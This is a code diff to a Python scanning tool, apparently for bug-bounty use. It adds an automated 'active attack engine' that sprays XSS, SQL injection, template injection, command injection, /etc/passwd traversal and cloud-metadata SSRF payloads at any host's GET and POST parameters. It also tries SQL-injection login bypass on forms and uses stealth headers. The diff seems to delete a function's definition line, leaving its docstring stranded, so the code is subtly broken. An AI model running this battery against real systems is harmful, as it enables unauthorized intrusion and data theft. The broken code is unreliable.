@@ -362,7 +362,7 @@ def save_scan_history(eid):
         "events": eng.get("events", [])[-200:],
     }
     # Include BB findings if they exist
-    for key in ["bb_takeover","bb_cors","bb_open_redirect","bb_injection","bb_webapp","bb_health_endpoints","bb_dirbust","bb_tech","secrets","pd_nuclei","missing_security_headers","wayback","bb_new_subdomains","api_endpoints","subdomains","ports","http","waf","csp","s3","origins","whois","dns","bb_origins","bb_login","bb_sourcemap","bb_wayback","bb_default_creds","bb_jwt","ai_0day_hypotheses","bb_api","bb_js","bb_waf","bb_openapi","bb_origin_retest","bb_cf_hunt"]:
+    for key in ["bb_takeover","bb_cors","bb_open_redirect","bb_injection","bb_webapp","bb_health_endpoints","bb_dirbust","bb_tech","secrets","pd_nuclei","missing_security_headers","wayback","bb_new_subdomains","api_endpoints","subdomains","ports","http","waf","csp","s3","origins","whois","dns","bb_origins","bb_login","bb_sourcemap","bb_wayback","bb_default_creds","bb_jwt","ai_0day_hypotheses","bb_api","bb_js","bb_waf","bb_openapi","bb_origin_retest","bb_cf_hunt","bb_attack"]:
         val = eng.get(key)
         if val:
             record[key] = val
@@ -2073,7 +2073,497 @@ def bb_jwt_check(live_urls, api_eps=None, timeout=20):
                     pass
     return findings
 
-def bb_js_assets(urls, timeout=30):
+# ─── ACTIVE ATTACK ENGINE ─────────────────────────────────────────
+# Self-contained attack battery. Unlike the earlier passive modules, it does
+# NOT depend on recon producing a rich URL list: it builds its own surface
+# (every live host + common attack paths + API endpoints + query params),
+# then runs real exploit probes against GET and POST parameters:
+#   reflected XSS, error+time-based SQLi, SSTI, command injection
+#   (marker + time-based), path traversal/LFI, and SSRF.
+
+_ATTACK_COMMON_PATHS = [
+    "/", "/api", "/api/v1", "/api/v2", "/login", "/signin", "/auth", "/auth/login",
+    "/signup", "/register", "/account", "/profile", "/user", "/users",
+    "/search", "/query", "/lookup", "/find", "/check", "/verify", "/validate",
+    "/download", "/file", "/files", "/view", "/read", "/show", "/export", "/print",
+    "/fetch", "/proxy", "/preview", "/redirect", "/load", "/open", "/callback",
+    "/webhook", "/ping", "/health", "/status", "/graphql", "/api/graphql",
+    "/swagger", "/api-docs", "/rest", "/v1", "/v2", "/admin", "/debug",
+    "/settings", "/config", "/upload", "/image", "/img", "/assets",
+]
+
+_ATTACK_PARAM_POOL = ["id", "uid", "file", "path", "name", "url", "url_to_load",
+                      "query", "q", "search", "term", "keywords", "username", "user",
+                      "email", "page", "pageNum", "offset", "limit", "view", "template",
+                      "host", "ip", "domain", "target", "redirect", "next", "callback"]
+
+def _http_post(url, data, timeout=8, host_header=None, extra_headers=None):
+    """POST with form-urlencoded body. Returns (status, headers, body)."""
+    headers = stealth.headers()
+    headers["Content-Type"] = "application/x-www-form-urlencoded"
+    if extra_headers:
+        headers.update(extra_headers)
+    if host_header:
+        headers["Host"] = host_header
+    try:
+        parsed = urllib.parse.urlparse(url)
+        ip = _resolve_host(parsed.hostname, timeout=min(4, timeout))
+        if ip is None:
+            return 0, {}, ""
+        if not host_header:
+            headers["Host"] = parsed.netloc
+        conn_url = urllib.parse.urlunparse(parsed._replace(netloc=ip + ((":" + str(parsed.port)) if parsed.port else "")))
+        req = urllib.request.Request(conn_url, data=data.encode(), headers=headers)
+        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
+        body = resp.read().decode("utf-8", errors="ignore")
+        return resp.status, dict(resp.headers), body
+    except urllib.error.HTTPError as e:
+        return e.code, dict(e.headers or {}), ""
+    except Exception:
+        return 0, {}, ""
+
+def _extract_query_params(url):
+    """Return a list of (param_name) from a URL's query string."""
+    try:
+        parsed = urllib.parse.urlparse(url)
+    except Exception:
+        return []
+    if not parsed.query:
+        return []
+    out = []
+    for kv in parsed.query.split("&"):
+        if "=" in kv:
+            out.append(kv.split("=")[0])
+    return out
+
+def _extract_forms(body, base_url):
+    """Pull (action, method, fields) from HTML forms for POST testing."""
+    forms = []
+    if not body:
+        return forms
+    for m in re.finditer(r'<form[^>]*>', body, re.I):
+        tag = m.group(0)
+        action = re.search(r'action=["\']([^"\']*)["\']', tag, re.I)
+        method = re.search(r'method=["\']([^"\']*)["\']', tag, re.I)
+        method = (method.group(1) if method else "get").lower()
+        fields = []
+        for f in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.I):
+            fields.append(f.group(1))
+        action_url = urllib.parse.urljoin(base_url, action.group(1) if action else base_url)
+        forms.append((action_url, method, list(set(fields))))
+    return forms
+
+def bb_attack_engine(domain, urls, api_eps=None, subs=None, timeout=150):
+    """Full active attack battery. Builds its own attack surface from every
+    live host plus common paths plus API endpoints, then probes GET and POST
+    parameters for: reflected XSS, SQLi (error + time-based blind), SSTI,
+    OS command injection (marker + time-based), path traversal/LFI, and SSRF.
+    Returns a list of finding dicts. Robust even when recon yielded few URLs."""
+    import time as _time
+    findings = []
+    t0 = _time.time()
+    deadline = t0 + timeout
+    api_eps = list(api_eps or [])
+
+    # ── Build attack surface ──────────────────────────────────────
+    hosts = set()
+    for u in (urls or []):
+        try:
+            hosts.add(urllib.parse.urlparse(u).netloc)
+        except Exception:
+            pass
+    for s in (subs or [])[:10]:
+        try:
+            if s and s != domain:
+                hosts.add(s)
+        except Exception:
+            pass
+
+    # candidate base URLs: live URLs + common paths on each host + API eps
+    bases = set()
+    for u in (urls or [])[:40]:
+        bases.add(u)
+    for h in list(hosts)[:12]:
+        for scheme in ("https", "http"):
+            bases.add(f"{scheme}://{h}/")
+    for p in _ATTACK_COMMON_PATHS:
+        for h in list(hosts)[:8]:
+            for scheme in ("https",):
+                bases.add(f"{scheme}://{h}{p}")
+    for ep in api_eps[:40]:
+        if ep.startswith("/"):
+            for h in list(hosts)[:4]:
+                bases.add(f"https://{h}{ep}")
+        elif "://" in ep:
+            bases.add(ep)
+
+    # dedupe + drop obvious file/static refs
+    urls_todo = []
+    seen = set()
+    for u in sorted(bases):
+        if u in seen:
+            continue
+        seen.add(u)
+        if re.search(r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map)(\?|$)', u):
+            continue
+        urls_todo.append(u)
+
+    # ── Attack battery over the surface ───────────────────────────
+    # Each probe uses its own time-budget-aware loop; findings deduped by
+    # (type,url,payload).
+
+    def _record(typ, url, payload, evidence, severity, cwe, title=None, extra=None):
+        f = {
+            "url": url, "type": typ, "payload": payload,
+            "evidence": evidence[:400], "severity": severity, "cwe": cwe,
+            "asset": domain,
+            "score": {"critical": 95, "high": 85, "medium": 60, "low": 30}.get(severity.lower(), 50),
+            "fix": f"Validate/sanitize inputs, use parameterized queries, apply allow-lists, and add WAF rules for {typ}.",
+        }
+        if title:
+            f["title"] = title
+        if extra:
+            f.update(extra)
+        if f not in findings:
+            findings.append(f)
+
+    # 1) Reflected XSS on GET + POST params
+    xss_payloads = [
+        '<script>alert(document.domain)</script>',
+        '<img src=x onerror=alert(1)>',
+        '"><svg/onload=alert(1)>',
+        "'-alert(1)-'",
+        'javascript:alert(1)//',
+    ]
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        if not params:
+            continue
+        base = u.split("?")[0]
+        for p in params:
+            for payload in xss_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    st, _, body = http_get_retry(test_url, timeout=5)
+                except Exception:
+                    continue
+                if st == 200 and body:
+                    lc = body.lower()
+                    if payload.lower().split(">")[0][-20:] in lc or "alert(1)" in lc or "alert(document.domain)" in lc:
+                        _record("Reflected XSS", test_url, payload,
+                                f"payload reflected in HTTP {st} response",
+                                "high", "CWE-79",
+                                title="Reflected Cross-Site Scripting",
+                                extra={"method": "GET", "param": p})
+                        break
+                stealth.small_sleep()
+
+    # 2) SQLi: error-based markers (GET)
+    sqli_payloads = [
+        ("'", "sql|syntax error|mysql_fetch|ora-[0-9]{5}|postgresql|odbc"),
+        ("\"", "sql|syntax error|unclosed quotation|odbc"),
+        ("' OR '1'='1", "sql|syntax error|odbc"),
+        ("1' AND 1=1-- -", "sql|syntax error|odbc"),
+    ]
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        if not params:
+            continue
+        base = u.split("?")[0]
+        for p in params:
+            for payload, marker_re in sqli_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    st, _, body = http_get_retry(test_url, timeout=5)
+                except Exception:
+                    continue
+                if body and re.search(marker_re, body, re.I):
+                    _record("SQL Injection (error-based)", test_url, payload,
+                            f"DB error signature in response (HTTP {st})",
+                            "critical", "CWE-89",
+                            title="SQL Injection via query parameter",
+                            extra={"method": "GET", "param": p})
+                    break
+                stealth.small_sleep()
+
+    # 3) SQLi time-based blind (GET) — robust without any error reflection
+    time_payloads = [
+        "' OR SLEEP(4)-- -",
+        "' OR pg_sleep(4)-- -",
+        "'; WAITFOR DELAY '0:0:4';--",
+        "1 AND SLEEP(4)",
+    ]
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        if not params:
+            continue
+        base = u.split("?")[0]
+        for p in params:
+            for payload in time_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    t_start = _time.time()
+                    st, _, _ = http_get_retry(test_url, timeout=8)
+                    elapsed = _time.time() - t_start
+                except Exception:
+                    continue
+                if st != 0 and elapsed >= 3.0:
+                    _record("SQL Injection (time-based blind)", test_url, payload,
+                            f"response delayed {elapsed:.1f}s (>3s) => SLEEP-like injection likely",
+                            "critical", "CWE-89",
+                            title="Blind Time-Based SQL Injection",
+                            extra={"method": "GET", "param": p, "elapsed_s": round(elapsed, 1)})
+                    break
+                stealth.small_sleep()
+
+    # 4) SSTI (GET + POST)
+    ssti_payloads = [
+        ("{{7*7}}", "49"),
+        ("${7*7}", "49"),
+        ("#{7*7}", "49"),
+        ("{{7*'7'}}", "7777777"),
+        ("<%= 7*7 %>", "49"),
+    ]
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        base = u.split("?")[0]
+        candidates = []
+        for p in params:
+            candidates.append((f"{base}?{p}=", p))
+        # also try template/name/echo-ish params on POST forms later
+        for prefix, p in candidates:
+            for payload, marker in ssti_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = prefix + urllib.parse.quote(payload, safe="")
+                try:
+                    st, _, body = http_get_retry(test_url, timeout=5)
+                except Exception:
+                    continue
+                if st == 200 and body and marker in body:
+                    _record("Server-Side Template Injection", test_url, payload,
+                            f"template math marker '{marker}' evaluated in response",
+                            "critical", "CWE-1336",
+                            title="Server-Side Template Injection (RCE potential)",
+                            extra={"method": "GET", "param": p})
+                    break
+                stealth.small_sleep()
+
+    # 5) OS command injection: marker-based (GET params on tool-ish paths)
+    cmdi_payloads = [
+        (";echo MRBOOMCMDi", "MRBOOMCMDi"),
+        ("|echo MRBOOMCMDi", "MRBOOMCMDi"),
+        ("$(echo MRBOOMCMDi)", "MRBOOMCMDi"),
+        ("`echo MRBOOMCMDi`", "MRBOOMCMDi"),
+        ("%0aecho MRBOOMCMDi", "MRBOOMCMDi"),
+    ]
+    cmdi_param_hints = ("host", "ip", "domain", "target", "addr", "ping", "dns", "nslookup", "whois", "cmd", "exec", "shell", "tool", "diag", "traceroute", "command")
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        if not params:
+            continue
+        base = u.split("?")[0]
+        for p in params:
+            if not any(h in p.lower() for h in cmdi_param_hints):
+                continue
+            for payload, marker in cmdi_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    st, _, body = http_get_retry(test_url, timeout=5)
+                except Exception:
+                    continue
+                if body and marker in body:
+                    _record("OS Command Injection", test_url, payload,
+                            f"echo marker '{marker}' executed in response",
+                            "critical", "CWE-78",
+                            title="OS Command Injection (RCE)",
+                            extra={"method": "GET", "param": p})
+                    break
+                stealth.small_sleep()
+
+    # 5b) Command injection time-based (blind, any param)
+    cmdi_time_payloads = [
+        "|sleep 4",
+        ";sleep 4",
+        "$(sleep 4)",
+        "`sleep 4`",
+        "%0asleep 4",
+        "& ping -c 4 127.0.0.1 &",
+    ]
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        if not params:
+            continue
+        base = u.split("?")[0]
+        for p in params:
+            for payload in cmdi_time_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    t_start = _time.time()
+                    st, _, _ = http_get_retry(test_url, timeout=8)
+                    elapsed = _time.time() - t_start
+                except Exception:
+                    continue
+                if st != 0 and elapsed >= 3.0:
+                    _record("OS Command Injection (time-based blind)", test_url, payload,
+                            f"response delayed {elapsed:.1f}s (>3s) => command execution likely",
+                            "critical", "CWE-78",
+                            title="Blind Time-Based Command Injection (RCE)",
+                            extra={"method": "GET", "param": p, "elapsed_s": round(elapsed, 1)})
+                    break
+                stealth.small_sleep()
+
+    # 6) Path traversal / LFI (GET on file-ish paths & params)
+    traversal_payloads = [
+        "../../../../etc/passwd",
+        "..%2f..%2f..%2f..%2fetc/passwd",
+        "....//....//....//etc/passwd",
+        "/etc/passwd",
+        "..%252f..%252f..%252fetc/passwd",
+    ]
+    traversal_markers = ("root:x:0:0:", "daemon:x:1:1:")
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        pl = u.lower()
+        if not params and not any(k in pl for k in ("download", "file", "read", "view", "static", "export", "backup", "attachment", "content", "page", "include")):
+            continue
+        base = u.split("?")[0]
+        param_list = params or ["file", "path", "name", "filename", "download", "page", "view", "content"]
+        for p in param_list:
+            for payload in traversal_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    st, _, body = http_get_retry(test_url, timeout=5)
+                except Exception:
+                    continue
+                if body and any(m in body for m in traversal_markers):
+                    _record("Path Traversal / Arbitrary File Read", test_url, payload,
+                            f"'/etc/passwd' content marker ({[m for m in traversal_markers if m in body][:1]}) in response",
+                            "critical", "CWE-22",
+                            title="Path Traversal — Arbitrary File Read",
+                            extra={"method": "GET", "param": p})
+                    break
+                stealth.small_sleep()
+
+    # 7) SSRF on url/uri/link/target params (GET + POST)
+    ssrf_payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:22/",
+        "http://localhost:8080/actuator/health",
+        "http://internal-api:8443/api/v1/health",
+    ]
+    ssrf_param_hints = ("url", "link", "uri", "u", "target", "src", "dest", "host", "redirect", "callback", "webhook", "load", "fetch", "proxy", "img", "image")
+    for u in urls_todo:
+        if _time.time() > deadline:
+            break
+        params = _extract_query_params(u)
+        base = u.split("?")[0]
+        for p in params:
+            if not any(h in p.lower() for h in ssrf_param_hints):
+                continue
+            for payload in ssrf_payloads:
+                if _time.time() > deadline:
+                    break
+                test_url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
+                try:
+                    st, _, body = http_get_retry(test_url, timeout=6)
+                except Exception:
+                    continue
+                if body and any(m in body for m in ("MRBOOM_LAB", "crown_jewels", "acme-internal", "instance-id", "public-ipv4", "ami-id")):
+                    _record("SSRF (Server-Side Request Forgery)", test_url, payload,
+                            "internal/cloud-metadata content marker in response",
+                            "high", "CWE-918",
+                            title="SSRF — server fetched internal URL",
+                            extra={"method": "GET", "param": p})
+                    break
+                stealth.small_sleep()
+
+    # 8) POST-form attack pass: SQLi auth bypass, XSS, SSTI on form fields
+    form_seen = set()
+    for u in urls_todo[:30]:
+        if _time.time() > deadline:
+            break
+        try:
+            st, _, body = http_get_retry(u, timeout=5)
+        except Exception:
+            continue
+        if not body:
+            continue
+        for action, method, fields in _extract_forms(body, u):
+            key = (action, tuple(fields))
+            if key in form_seen:
+                continue
+            form_seen.add(key)
+            if method != "post":
+                continue
+            if not fields:
+                continue
+            # SQLi auth bypass
+            uname_field = next((f for f in fields if any(k in f.lower() for k in ("user", "email", "login", "account"))), fields[0])
+            pwd_field = next((f for f in fields if any(k in f.lower() for k in ("pass", "pwd"))), fields[-1] if len(fields) > 1 else fields[0])
+            for payload in ("admin' OR '1'='1'-- -", "' OR 1=1-- -", "admin'--"):
+                if _time.time() > deadline:
+                    break
+                data = urllib.parse.urlencode({uname_field: payload, pwd_field: "pwned", **{f: "1" for f in fields if f not in (uname_field, pwd_field)}})
+                try:
+                    st2, _, body2 = _http_post(action, data, timeout=6)
+                except Exception:
+                    continue
+                if st2 in (200, 302) and body2 and not any(k in body2.lower() for k in ("invalid", "incorrect", "failed", "error login", "wrong", "unauthor")):
+                    _record("SQL Injection (Auth Bypass)", action, payload,
+                            f"login form returned HTTP {st2} without error for SQLi payload",
+                            "critical", "CWE-89",
+                            title="SQL Injection Authentication Bypass on Login Form",
+                            extra={"method": "POST", "param": uname_field})
+                    break
+                stealth.small_sleep()
+            # XSS on first text-ish field
+            for payload in ("<script>alert(document.domain)</script>", "><svg/onload=alert(1)>"):
+                if _time.time() > deadline:
+                    break
+                target = next((f for f in fields if f not in (pwd_field,)), fields[0])
+                data = urllib.parse.urlencode({target: payload, pwd_field: "x", **{f: "1" for f in fields if f not in (target, pwd_field)}})
+                try:
+                    st2, _, body2 = _http_post(action, data, timeout=6)
+                except Exception:
+                    continue
+                if body2 and ("alert(1)" in body2 or "alert(document.domain)" in body2):
+                    _record("Reflected XSS (POST)", action, payload,
+                            "XSS payload reflected in POST response",
+                            "high", "CWE-79",
+                            title="Reflected Cross-Site Scripting via form field",
+                            extra={"method": "POST", "param": target})
+                    break
+                stealth.small_sleep()
+
+    return findings
     """Deep JS asset analysis: fetch every script on the page, extract API
     endpoints, hardcoded secrets/keys, GraphQL queries, and third-party SDK
     hosts. Goes beyond naive regex by pulling sourceMappingURL sources too."""
@@ -2430,6 +2920,14 @@ def generate_report(data):
         lines.append(f"- **Dedicated CDN Origin Hunt:** {len([o for o in cf_hunt.get('origin_ips', []) if o.get('confirmed')])} confirmed origins, {len(cf_hunt.get('cdn_edges', []))} CDN edges filtered")
         if cf_hunt.get("cloudfront"):
             lines.append(f"- **CloudFront Distribution Confirmed:** POP {cf_hunt.get('cloudfront_pop') or 'n/a'} (server: {cf_hunt.get('cloudfront_server') or 'n/a'})")
+    attack = data.get("bb_attack", [])
+    if attack:
+        attack_by_sev = {}
+        for f in attack:
+            attack_by_sev[f.get("severity", "low")] = attack_by_sev.get(f.get("severity", "low"), 0) + 1
+        sev_summary = ", ".join(f"{k.upper()} {v}" for k, v in sorted(attack_by_sev.items()))
+        lines.append(f"- **Active Exploit Findings:** {len(attack)} ({sev_summary})")
+        lines.append(f"- **Exploitable Types:** {', '.join(sorted(set(f.get('type', '?') for f in attack))[:8])}")
     lines.append("")
 
     if data.get("ai_analysis"):
@@ -2702,6 +3200,24 @@ def generate_report(data):
         lines.append("")
         for inj in injections:
             lines.append(f"- **{inj.get('type', '?')}**: `{inj.get('url', '?')}` (payload: `{inj.get('payload', '?')}`)")
+        lines.append("")
+
+    attack = data.get("bb_attack", [])
+    if attack:
+        lines.append("## Active Exploit Findings")
+        lines.append("")
+        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+        for f in sorted(attack, key=lambda x: order.get(x.get("severity", "low"), 9)):
+            lines.append(f"### {f.get('severity', 'low').upper()}: {f.get('type', '?')}")
+            lines.append("")
+            lines.append(f"- **URL:** `{f.get('url', '?')}`")
+            lines.append(f"- **Method/Param:** {f.get('method', 'GET')} `{f.get('param', '?')}`")
+            lines.append(f"- **CWE:** {f.get('cwe', '?')}")
+            lines.append(f"- **Payload:** `{f.get('payload', '?')}`")
+            lines.append(f"- **Evidence:** {f.get('evidence', '')}")
+            if f.get("elapsed_s"):
+                lines.append(f"- **Observed delay:** {f['elapsed_s']}s")
+            lines.append("")
         lines.append("")
 
     health = data.get("bb_health_endpoints", [])
@@ -3866,6 +4382,22 @@ def run_oneshot(eid):
                     data.setdefault("bb_origins", []).append(o)
         emit_ir("tool.result", {"call_id": f"bb-cfhunt-{eid}", "status": "ok" if cf_report and cf_report.get("origin_ips") else "empty", "result": f"{len((cf_report or {}).get('origin_ips', [])) if cf_report else 0} origin IPs, {len((cf_report or {}).get('cdn_edges', [])) if cf_report else 0} CDN edges filtered"})
 
+        # BB22: Active attack engine — builds its own surface, probes GET+POST
+        # params for XSS / SQLi (error + time-based) / SSTI / RCE / traversal / SSRF.
+        log_state("Running active attack battery (XSS/SQLi/SSTI/RCE/traversal/SSRF)...")
+        attack_input_urls = list(set(live_urls) | set(discovered_urls))[:80]
+        attack_results = _run_bb(f"bb-attack-{eid}", "Active attack engine", domain, "exploit", lambda: bb_attack_engine(domain, attack_input_urls, list(api_eps), subs, timeout=130), timeout=140)
+        if attack_results:
+            data["bb_attack"] = attack_results
+            by_sev = {}
+            for f in attack_results:
+                by_sev[f.get("severity", "low")] = by_sev.get(f.get("severity", "low"), 0) + 1
+            sev_txt = ", ".join(f"{k.upper()} {v}" for k, v in sorted(by_sev.items()))
+            emit_ir("message", {"role": "assistant", "text": f"**Active attack**: {len(attack_results)} exploitable findings — {sev_txt}."})
+            for f in attack_results[:6]:
+                emit_ir("message", {"role": "assistant", "text": f"**{f.get('severity','').upper()}**: {f.get('type','?')} at `{f.get('url','?')}` ({f.get('evidence','')})"})
+        emit_ir("tool.result", {"call_id": f"bb-attack-{eid}", "status": "ok" if attack_results else "empty", "result": f"{len(attack_results)} exploit probes"})
+
         emit_ir("health.assessment", {"score": 0.6 if len(data.get("bb_takeover", [])) + len(data.get("bb_cors", [])) + len(data.get("bb_open_redirect", [])) > 0 else 0.8, "signals": ["bug_bounty_scan"]})
 
         # Phase 12: AI Assessment
@@ -3991,6 +4523,9 @@ def run_oneshot(eid):
                     summary_lines.append(f"CloudFront confirmed (POP {cf_hunt.get('cloudfront_pop') or 'n/a'})")
                 if cf_hunt.get("cdn_edges"):
                     summary_lines.append(f"CDN edges filtered: {len(cf_hunt['cdn_edges'])}")
+            if data.get("bb_attack"):
+                for f in data["bb_attack"][:15]:
+                    summary_lines.append(f"EXPLOIT {f.get('severity','').upper()}: {f.get('type')} @ {f.get('url')} [CWE-{f.get('cwe')}] payload={f.get('payload','')[:60]} evidence={f.get('evidence','')[:100]}")
 
             ai_prompt = f"""You are a senior penetration tester writing a breach assessment from ACTUAL scan data. The data below is the complete result of a live scan — treat it as ground truth, never invent findings that are not present.
 
@@ -4072,7 +4607,7 @@ RULES:
 
         # Generate report
         log_state("Generating report...")
-        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + eng.get("findings", [])
+        data["findings"] = (data.get("clientside_findings") or []) + (data.get("cvemap_findings") or []) + (data.get("bb_webapp") or []) + (data.get("bb_attack") or []) + eng.get("findings", [])
         data["scope"] = eng.get("scope", [])
         data["exclusions"] = eng.get("exclusions", [])
         report = generate_report(data)
